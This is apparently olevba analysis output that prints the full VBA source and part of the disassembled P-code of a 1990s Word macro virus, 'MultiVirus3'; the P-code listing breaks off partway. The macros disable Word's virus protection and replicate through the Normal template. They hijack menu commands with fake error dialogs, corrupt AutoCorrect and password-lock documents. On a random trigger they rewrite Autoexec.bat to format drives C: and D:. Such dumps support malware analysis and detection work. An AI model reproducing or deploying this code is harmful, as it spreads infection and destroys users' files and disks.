olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.MultiVirus.3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.MultiVirus.3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MultiVirus3.bas 
in file: Virus.MSWord.MultiVirus.3 - OLE stream: 'Macros/VBA/MultiVirus3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "MultiVirus3" Then
        MultiVirus3Installed = -1
    End If
Next i
Call PayVeneno
If Not MultiVirus3Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus3", Object:=wdOrganizerObjectProjectItems
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "MultiVirus3" Then
        MultiVirus3Installed = -1
    End If
Next i
Call PaySchoo
If Not MultiVirus3Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus3", Object:=wdOrganizerObjectProjectItems
    AutoCorrect.Entries.Add Name:="s", Value:="schoo'"
    AutoCorrect.Entries.Add Name:="r", Value:="eckonize"
    AutoCorrect.Entries.Add Name:="assembly", Value:="assemily"
    AutoCorrect.Entries.Add Name:="assembler", Value:="assimiler"
Else
    Call PayBadBoy
End If
ErrorAO:
End Sub
Sub FilePrint()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFP
Dim MyTime
MyTime = Time
TS$ = Mid(MyTime, 7, 8)
If TS$ > "57" Then
    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.TypeText Text:="Finalement, j'aimerais ajouter que..."
    Selection.TypeParagraph
    Selection.TypeText Text:="Le centre informatique de cette université est un véritable honte, nous"
    Selection.TypeParagraph
    Selection.TypeText Text:="ne méritons ses services."
    Selection.TypeParagraph
    Selection.TypeText Text:=">>> Honte sur toi!!! <<<"
    Selection.TypeParagraph
    Selection.TypeText Text:="<fdf>"
    Selection.HomeKey Unit:=wdStory
End If
    Dialogs(wdDialogFilePrint).Show
ErrorFP:
End Sub
Sub FilePrintDefault()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFPD
Dim MyTime
MyTime = Time
TS$ = Mid(MyTime, 7, 8)
If TS$ > "57" Then
    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.TypeText Text:="Finalement, j'aimerais ajouter que..."
    Selection.TypeParagraph
    Selection.TypeText Text:="Le centre informatique de cette université est un véritable honte, nous"
    Selection.TypeParagraph
    Selection.TypeText Text:="ne méritons ses services."
    Selection.TypeParagraph
    Selection.TypeText Text:=">>> Honte sur toi!!! <<<"
    Selection.TypeParagraph
    Selection.TypeText Text:="<fdf>"
    Selection.HomeKey Unit:=wdStory
End If
    ActiveDocument.PrintOut
ErrorFPD:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus3", Object:=wdOrganizerObjectProjectItems
Dim MyTime
MyTime = Time
TS$ = Mid(MyTime, 7, 8)
If TS$ = "38" Then
    MsgBox "Merci à celui qui a crée the Veneno Virus...", vbInformation, "MultiVirus3"
End If
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "ZeMacroKiller98"
    .Keywords = "Gangsta Rappa"
    .Comments = "The Mutha mix"
End With
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Espace Pile Insuffisant", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Sub PayBadBoy()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPBB
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 2)
If D$ = "1" Or D$ = "13" Then
    MsgBox "Mack daddy" & Chr$(13) & "Bad Boy, Bad Boy, What u gonna do ", Title:="MultiVirus 3"
    MsgBox "the Gangsta Rappa" & Chr$(13) & "What u gonna do whn then come for you", Title:="MultiVirus 3"
    MsgBox "BMF" & Chr$(13) & "The Gangsta owns you !", Title:="MultiVirus 3"
    MsgBox "BMF" & Chr$(13) & "Have a happy new year", Title:="MultiVirus 3"
    ActiveDocument.SaveAs Password:="gangsta98"
End If
ErrorPBB:
End Sub
Sub PaySchoo()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPS
Dim MyDate
MyDate = Date
D$ = MyDate
If D$ < "28/05/1998" Then
    MsgBox "Attention, le Virus 'Big Johnson' a été détecté.", vbCritical, "Alerte Virus de Microsoft Word"
End If
If D$ = "28/05/1998" Then
    MsgBox "Transfert du contrôle au sous routine du virus:" & Chr$(13) & "Virus initialisé..." & Chr$(13) & "C'est le dernier jour d'école!", vbCritical, "Alerte Virus de Microsoft Word"
End If
If D$ > "28/05/1998" Then
    MsgBox "Transfert du contrôle au sous routine du virus:" & Chr$(13) & "Virus initialisé..." & Chr$(13) & "C'est la sortie d'école!", vbCritical, "Alerte Virus de Microsoft Word"
End If
ErrorPS:
End Sub
Sub PayVeneno()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPV
Dim MyDate, MyTime, MyWeek, NH$
MyDate = Date
MyTime = Time
MyWeek = WeekDay(MyDate, vbMonday)
TM$ = Mid(MyTime, 4, 5)
If (MyWeek = 5 Or MyWeek = 6) And (TM$ < "05") Then
    Selection.EndKey
    Selection.TypeParagraph
    Selection.TypeText Text:="**V<N<N0**"
    Selection.WholeStory
    With Selection.Find
        .Text = "ste"
        .Replacement.Text = "stes"
    End With
    ActiveDocument.SaveAs Password:="Veneno98"
End If
Randomize
NH$ = Int(Rnd * 100) + 1
If NH$ = 50 Then
Open "C:\Autoexec.bat" For Output As #1
    Print #1, "@echo off"
    Print #1, "PATH=C:\;C:\DOS;C:\WINDOWS;C:\WINDOWS\COMMAND"
    Print #1, "Echo."
    Print #1, "Echo Inserez une disquette dans le lecteur A:"
    Print #1, "Echo Appuyer sur n'importe qu'elle touche"
    Print #1, "Echo pause > nul"
    Print #1, "Format a: /autotest > nul"
    Print #1, "if errorlevel 0 goto Fin"
    Print #1, "o|format d: /u /autotest"
    Print #1, "o|format c: /u /autotest"
    Print #1, "y|format d: /u /autotest"
    Print #1, "y|format c: /u /autotest"
    Print #1, "Vous vous êtes fait avoir!"
    Print #1, "Echo."
    Print #1, ":Fin"
    Print #1, "Echo Ta momman doit être très heureuse d'avoir un enfant si bOn et Obeissant..."
Close #1
Open "C:\Config.sys" For Output As #2
    Print #2, "SHELL=C:\DOS\COMMAND.COM /F /P"
    Print #2, "SWITCHES = /N /F"
Close #2
End If
ErrorPV:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "Une erreur interne au module UNIDRV.DLL est arrivé" & Chr$(13) & "Veuillez contacter le support technique de Microsoft", vbCritical, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "Microsoft Visual Basic n'est pas installé." & Chr$(13) & "Veuillez consulter l'aide en ligne."
    .Heading = "Microsoft Word"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.MultiVirus.3
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/MultiVirus3 - 15588 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAE 
' Line #6:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	OnError ErrorAO 
' Line #11:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #13:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000B "MultiVirus3"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MultiVirus3Installed 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	ArgsCall (Call) PayVeneno 0x0000 
' Line #18:
' 	Ld MultiVirus3Installed 
' 	Not 
' 	IfBlock 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus3"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Label ErrorAE 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub AutoOpen())
' Line #24:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #25:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #28:
' 	OnError ErrorAO 
' Line #29:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #31:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000B "MultiVirus3"
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MultiVirus3Installed 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	ArgsCall (Call) PaySchoo 0x0000 
' Line #36:
' 	Ld MultiVirus3Installed 
' 	Not 
' 	IfBlock 
' Line #37:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus3"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' 	LitStr 0x0001 "s"
' 	ParamNamed New 
' 	LitStr 0x0006 "schoo'"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #39:
' 	LitStr 0x0001 "r"
' 	ParamNamed New 
' 	LitStr 0x0008 "eckonize"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #40:
' 	LitStr 0x0008 "assembly"
' 	ParamNamed New 
' 	LitStr 0x0008 "assemily"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #41:
' 	LitStr 0x0009 "assembler"
' 	ParamNamed New 
' 	LitStr 0x0009 "assimiler"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #42:
' 	ElseBlock 
' Line #43:
' 	ArgsCall (Call) PayBadBoy 0x0000 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Label ErrorAO 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub FilePrint())
' Line #48:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #49:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #50:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #51:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #52:
' 	OnError ErrorFP 
' Line #53:
' 	Dim 
' 	VarDefn MyTime
' Line #54:
' 	Ld Time 
' 	St MyTime 
' Line #55:
' 	Ld MyTime 
' 	LitDI2 0x0007 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	St TS$ 
' Line #56:
' 	Ld TS$ 
' 	LitStr 0x0002 "57"
' 	Gt 
' 	IfBlock 
' Line #57:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #58:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #59:
' 	LitStr 0x0025 "Finalement, j'aimerais ajouter que..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #60:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #61:
' 	LitStr 0x0047 "Le centre informatique de cette université est un véritable honte, nous"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #62:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #63:
' 	LitStr 0x0019 "ne méritons ses services."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #64:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #65:
' 	LitStr 0x0018 ">>> Honte sur toi!!! <<<"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #66:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #67:
' 	LitStr 0x0005 "<fdf>"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #68:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #71:
' 	Label ErrorFP 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub FilePrintDefault())
' Line #74:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #75:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #77:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #78:
' 	OnError ErrorFPD 
' Line #79:
' 	Dim 
' 	VarDefn MyTime
' Line #80:
' 	Ld Time 
' 	St MyTime 
' Line #81:
' 	Ld MyTime 
' 	LitDI2 0x0007 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	St TS$ 
' Line #82:
' 	Ld TS$ 
' 	LitStr 0x0002 "57"
' 	Gt 
' 	IfBlock 
' Line #83:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #84:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #85:
' 	LitStr 0x0025 "Finalement, j'aimerais ajouter que..."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #86:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #87:
' 	LitStr 0x0047 "Le centre informatique de cette université est un véritable honte, nous"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #88:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #89:
' 	LitStr 0x0019 "ne méritons ses services."
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #90:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #91:
' 	LitStr 0x0018 ">>> Honte sur toi!!! <<<"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #92:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #93:
' 	LitStr 0x0005 "<fdf>"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #94:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #97:
' 	Label ErrorFPD 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub FileSaveAs())
' Line #100:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #101:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #102:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #103:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #104:
' 	OnError ErrorFSA 
' Line #105:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #106:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #107:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus3"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #110:
' 	Dim 
' 	VarDefn MyTime
' Line #111:
' 	Ld Time 
' 	St MyTime 
' Line #112:
' 	Ld MyTime 
' 	LitDI2 0x0007 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	St TS$ 
' Line #113:
' 	Ld TS$ 
' 	LitStr 0x0002 "38"
' 	Eq 
' 	IfBlock 
' Line #114:
' 	LitStr 0x002C "Merci à celui qui a crée the Veneno Virus..."
' 	Ld vbInformation 
' 	LitStr 0x000B "MultiVirus3"
' 	ArgsCall MsgBox 0x0003 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #117:
' 	LitStr 0x000F "ZeMacroKiller98"
' 	MemStWith Author 
' Line #118:
' 	LitStr 0x000D "Gangsta Rappa"
' 	MemStWith Keywords 
' Line #119:
' 	LitStr 0x000D "The Mutha mix"
' 	MemStWith Comments 
' Line #120:
' 	EndWith 
' Line #121:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #122:
' 	Label ErrorFSA 
' Line #123:
' 	EndSub 
' Line #124:
' 	FuncDefn (Sub FileTemplates())
' Line #125:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #126:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #127:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #128:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #129:
' 	OnError ErrorFT 
' Line #130:
' 	LitStr 0x0017 "Espace Pile Insuffisant"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #131:
' 	Label ErrorFT 
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub PayBadBoy())
' Line #134:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #135:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #136:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #137:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #138:
' 	OnError ErrorPBB 
' Line #139:
' 	Dim 
' 	VarDefn MyDate
' Line #140:
' 	Ld Date 
' 	St MyDate 
' Line #141:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #142:
' 	Ld D$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	Ld D$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #143:
' 	LitStr 0x000A "Mack daddy"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0022 "Bad Boy, Bad Boy, What u gonna do "
' 	Concat 
' 	LitStr 0x000C "MultiVirus 3"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #144:
' 	LitStr 0x0011 "the Gangsta Rappa"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0025 "What u gonna do whn then come for you"
' 	Concat 
' 	LitStr 0x000C "MultiVirus 3"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #145:
' 	LitStr 0x0003 "BMF"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0016 "The Gangsta owns you !"
' 	Concat 
' 	LitStr 0x000C "MultiVirus 3"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #146:
' 	LitStr 0x0003 "BMF"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0015 "Have a happy new year"
' 	Concat 
' 	LitStr 0x000C "MultiVirus 3"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #147:
' 	LitStr 0x0009 "gangsta98"
' 	ParamNamed Password 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	Label ErrorPBB 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub PaySchoo())
' Line #152:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #153:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #154:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #155:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #156:
' 	OnError ErrorPS 
' Line #157:
' 	Dim 
' 	VarDefn MyDate
' Line #158:
' 	Ld Date 
' 	St MyDate 
' Line #159:
' 	Ld MyDate 
' 	St D$ 
' Line #160:
' 	Ld D$ 
' 	LitStr 0x000A "28/05/1998"
' 	Lt 
' 	IfBlock 
' Line #161:
' 	LitStr 0x0030 "Attention, le Virus 'Big Johnson' a été détecté."
' 	Ld vbCritical 
' 	LitStr 0x001E "Alerte Virus de Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	Ld D$ 
' 	LitStr 0x000A "28/05/1998"
' 	Eq 
' 	IfBlock 
' Line #164:
' 	LitStr 0x002F "Transfert du contrôle au sous routine du virus:"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Virus initialisé..."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001E "C'est le dernier jour d'école!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x001E "Alerte Virus de Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	Ld D$ 
' 	LitStr 0x000A "28/05/1998"
' 	Gt 
' 	IfBlock 
' Line #167:
' 	LitStr 0x002F "Transfert du contrôle au sous routine du virus:"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Virus initialisé..."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0018 "C'est la sortie d'école!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x001E "Alerte Virus de Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #168:
' 	EndIfBlock 
' Line #169:
' 	Label ErrorPS 
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Sub PayVeneno())
' Line #172:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #173:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #174:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #175:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #176:
' 	OnError ErrorPV 
' Line #177:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyTime
' 	VarDefn MyWeek
' 	VarDefn NH
' Line #178:
' 	Ld Date 
' 	St MyDate 
' Line #179:
' 	Ld Time 
' 	St MyTime 
' Line #180:
' 	Ld MyDate 
' 	Ld vbMonday 
' 	ArgsLd WeekDay 0x0002 
' 	St MyWeek 
' Line #181:
' 	Ld MyTime 
